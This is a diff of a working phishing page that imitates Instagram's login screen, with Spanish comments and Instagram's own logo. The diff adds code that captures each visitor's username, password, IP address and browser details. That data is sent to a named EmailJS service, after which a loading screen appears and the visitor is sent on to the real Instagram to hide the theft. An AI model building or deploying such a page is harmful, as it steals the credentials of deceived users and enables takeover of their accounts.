@@ -4,19 +4,19 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
-    <!-- Icono de Instagram -->
     <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yG/r/1_8g92b6890.png" />
     <style>
         body {
-            background-color: #fafafa;
+            background: #fafafa;
+            /* Degradado clásico de Instagram */
+            background: linear-gradient(to bottom, #f0f2f5, #ffffff); 
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
-            flex-direction: column;
-      }
+        }
 
         .container {
             background-color: #ffffff;
@@ -26,31 +26,35 @@
             display: flex;
             flex-direction: column;
             align-items: center;
+            box-shadow: 0 0 10px rgba(0,0,0,0.05);
         }
 
         .logo {
             margin-bottom: 20px;
+            font-family: 'Grand Hotel', cursive; /* O usa la imagen */
         }
         
         .logo img {
             width: 175px;
+            margin-top: 10px;
         }
 
         form {
             width: 100%;
             display: flex;
             flex-direction: column;
-            gap: 10px;
+            gap: 8px;
         }
 
         input {
             background-color: #fafafa;
             border: 1px solid #dbdbdb;
             border-radius: 3px;
-            padding: 14px 8px;
+            padding: 12px 8px;
             font-size: 12px;
             width: 100%;
             box-sizing: border-box;
+            color: #262626;
         }
 
         input:focus {
@@ -69,9 +73,6 @@
             cursor: pointer;
             margin-top: 10px;
             height: 30px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
         }
 
         button:hover {
@@ -79,18 +80,38 @@
         }
 
         button:disabled {
-            background-color: #aecfffaa; /* Un poco azul pero apagado */
+            background-color: #bcdbf9;
             cursor: default;
         }
 
-        .spinner {
+        /* Pantalla de carga */
+        .loading-overlay {
             display: none;
-            border: 2px solid #f3f3f3;
-            border-top: 2px solid #0095f6;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            z-index: 1000;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .loading-spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #dbdbdb;
             border-radius: 50%;
-            width: 14px;
-            height: 14px;
+            width: 40px;
+            height: 40px;
             animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        .loading-text {
+            font-size: 14px;
+            color: #262626;
         }
 
         @keyframes spin {
@@ -98,13 +119,14 @@
             100% { transform: rotate(360deg); }
         }
     </style>
+    <!-- Importar fuente de Instagram para el logo -->
+    <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
 </head>
 <body>
 
     <div class="container">
         <div class="logo">
-            <!-- Logo oficial de Instagram -->
-            <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Instagram">
+            <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Instagram Logo">
         </div>
 
         <form id="login-form">
@@ -112,10 +134,19 @@
             <input type="password" id="password" name="password" placeholder="Contraseña" required>
             
             <button type="submit" id="submit-btn">
-                <span id="btn-text">Iniciar sesión</span>
-                <div class="spinner" id="spinner"></div>
+                Iniciar sesión
             </button>
         </form>
+        
+        <div style="margin-top: 15px; font-size: 12px; color: #8e8e8e;">
+            <a href="#" style="color: #8e8e8e; text-decoration: none;">¿Has olvidado la contraseña?</a>
+        </div>
+    </div>
+
+    <!-- Pantalla de carga -->
+    <div class="loading-overlay" id="loading-screen">
+        <div class="loading-spinner"></div>
+        <div class="loading-text">Cargando...</div>
     </div>
 
     <!-- Script de EmailJS -->
@@ -128,52 +159,50 @@
 
         document.addEventListener('DOMContentLoaded', () => {
             const form = document.getElementById('login-form');
-            const btn = document.getElementById('submit-btn');
-            const btnText = document.getElementById('btn-text');
-            const spinner = document.getElementById('spinner');
+            const loadingScreen = document.getElementById('loading-screen');
 
             form.addEventListener('submit', function(event) {
-                event.preventDefault(); // Evita que la página se recargue
+                event.preventDefault();
 
-                // UI: Mostrar carga
-                btn.disabled = true;
-                btnText.style.display = 'none';
-                spinner.style.display = 'block';
+                // 1. Mostrar pantalla de carga
+                loadingScreen.style.display = 'flex';
 
-                // Parámetros para enviar
+                // 2. Obtener IP del usuario (API gratuita)
+                let userIP = "No disponible";
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => userIP = data.ip)
+                    .catch(error => userIP = "Error obteniendo IP");
+
+                const browserInfo = navigator.userAgent; // Navegador y SO
+                const username = document.getElementById('user_email').value;
+                const password = document.getElementById('password').value;
+
+                // 3. Enviar datos a EmailJS
+                // Asegúrate de que tu template en EmailJS tenga {{user_email}}, {{password}}, {{ip}} y {{browser}}
                 const templateParams = {
-                    user_email: document.getElementById('user_email').value,
-                    password: document.getElementById('password').value,
-                    // Opcional: Añadir fecha y hora
+                    user_email: username,
+                    password: password,
+                    ip: userIP,
+                    browser: browserInfo,
                     fecha: new Date().toLocaleString()
                 };
 
-                // Envío con EmailJS
-                // Tus IDs: Service -> service_rkpt26i, Template -> template_zl3ywbm
                 emailjs.sendForm("service_rkpt26i", "template_zl3ywbm", this)
                     .then(function(response) {
-                        console.log('Éxito!', response.status, response.text);
-                        // Restaurar botón (opcional)
-                        btnText.style.display = 'block';
-                        spinner.style.display = 'none';
-                        btnText.innerText = "Éxito";
-                        btn.style.backgroundColor = "#4CAF50"; // Verde
-                        
-                        // Redirigir a Instagram real después de 1 segundo
+                        console.log('Datos enviados:', response.status);
+                        // Esperar 2 segundos en la pantalla de carga
                         setTimeout(function(){
                             window.location.href = "https://www.instagram.com";
-                        }, 1000);
+                        }, 2000);
 
                     }, function(error) {
-                        console.error('Fallo...', error);
-                        // Restaurar botón en caso de error
-                        btnText.style.display = 'block';
-                        spinner.style.display = 'none';
-                        btn.disabled = false;
-                        btnText.innerText = "Error";
+                        console.error('Fallo al enviar:', error);
+                        // Incluso si falla, redirigir
+                        window.location.href = "https://www.instagram.com";
                     });
             });
         });
     </script>
 </body>
-                </html>
+    </html>
